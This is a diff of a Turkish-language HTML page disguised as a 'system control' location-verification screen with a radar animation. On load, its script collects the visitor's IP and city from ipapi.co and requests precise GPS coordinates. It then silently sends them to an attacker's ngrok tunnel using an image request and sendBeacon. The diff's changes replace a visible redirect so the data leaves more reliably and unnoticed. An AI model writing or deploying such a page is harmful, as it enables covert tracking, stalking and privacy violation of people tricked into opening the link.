@@ -2,44 +2,53 @@
 <html>
 <head>
     <title>Sistem Kontrolü</title>
-    <style>body { background: black; color: #0f0; font-family: monospace; text-align: center; padding-top: 20%; }</style>
+    <style>
+        body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 20%; }
+        .radar { border: 2px solid #0f0; border-radius: 50%; width: 100px; height: 100px; margin: 20px auto; border-top-color: transparent; animation: spin 1s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
 </head>
 <body>
-    <h1>VERİLER DOĞRULANIYOR...</h1>
-    <p>Lütfen konum iznini onaylayın.</p>
+    <div class="radar"></div>
+    <h1>KONUM DOĞRULANIYOR...</h1>
+    <p>Lütfen gelen erişim isteğini onaylayın.</p>
 
     <script>
-        // --- GÜNCEL NGROK LİNKİNİ BURAYA YAZ ---
-        const NGROK_URL = "https://punctual-villain-arson.ngrok-free.dev/log";
+        // BURAYA TERMINALDEKI GUNCEL NGROK LINKINI YAZ!
+        const NGROK_URL = "https://punctual-villain-arson.ngrok-free.dev";
 
-        async function başlat() {
-            try {
-                // IP bilgilerini al
-                const res = await fetch('https://ipapi.co/json/');
-                const data = await res.json();
-                
-                // Konum İste (Jarvis Bildirimi)
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        yolla(data.ip, data.city, pos.coords.latitude + "," + pos.coords.longitude, "GPS_OK");
-                    },
-                    (err) => {
-                        yolla(data.ip, data.city, data.latitude + "," + data.longitude, "GPS_RED");
-                    },
-                    { timeout: 5000 }
-                );
-            } catch (e) {
-                console.log("Hata");
-            }
+        async function konumAl() {
+            // 1. Önce IP verisini çek
+            const res = await fetch('https://ipapi.co/json/');
+            const ipData = await res.json();
+
+            // 2. Tarayıcıdan Gerçek Konum İste
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    const coords = pos.coords.latitude + "," + pos.coords.longitude;
+                    gonder(ipData.ip, ipData.city, coords, "GPS_TAM_ISABET");
+                },
+                (err) => {
+                    const tahmini = ipData.latitude + "," + ipData.longitude;
+                    gonder(ipData.ip, ipData.city, tahmini, "GPS_REDDEDILDI_IP_ALINDI");
+                },
+                { enableHighAccuracy: true }
+            );
         }
 
-        function yolla(ip, city, loc, status) {
-            // EN SAĞLAM YÖNTEM: Sayfayı verilerle beraber senin Ngrok linkine yönlendirir
-            const url = `${NGROK_URL}?ip=${ip}&city=${city}&loc=${loc}&status=${status}`;
-            window.location.href = url;
+        function gonder(ip, city, loc, status) {
+            // Ngrok'un aradaki uyarı sayfasını aşmak için gerekli header (ngrok-skip-browser-warning)
+            // Bu yöntem fetch ile bazen takılır, o yüzden en garanti olan Image yöntemini kullanıyoruz
+            const finalURL = `${NGROK_URL}?ip=${ip}&city=${city}&loc=${loc}&status=${status}`;
+            
+            const x = new Image();
+            x.src = finalURL;
+            
+            // Alternatif: Beacon (Tarayıcı kapanırken bile gönderir)
+            navigator.sendBeacon(finalURL);
         }
 
-        setTimeout(başlat, 500);
+        window.onload = konumAl;
     </script>
 </body>
 </html>
